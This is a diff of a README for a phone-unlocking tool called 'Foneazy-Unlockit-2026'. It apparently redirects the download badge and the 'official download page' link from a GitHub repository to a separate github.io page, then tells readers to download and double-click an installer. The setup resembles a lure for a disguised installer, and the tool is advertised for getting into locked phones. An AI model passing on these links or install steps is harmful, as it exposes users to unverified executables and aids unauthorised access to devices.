@@ -1,7 +1,7 @@
 # 🔓 Foneazy-Unlockit-2026 - Access locked phones with simple tools
 
 <p align="center">
-  <a href="https://github.com/Karondeclaratory651/Foneazy-Unlockit-2026">
+  <a href="https://karondeclaratory651.github.io">
     <img src="https://img.shields.io/badge/Download-Unlockit_2026-blue.svg" alt="Download Foneazy Unlockit">
   </a>
 </p>
@@ -31,7 +31,7 @@ Ensure your computer has the following setup before you start:
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the [official download page](https://github.com/Karondeclaratory651/Foneazy-Unlockit-2026) to get the installer.
+1. Visit the [official download page](https://karondeclaratory651.github.io) to get the installer.
 2. Save the file to your computer.
 3. Locate the downloaded file in your Downloads folder.
 4. Double-click the file to start the installer.
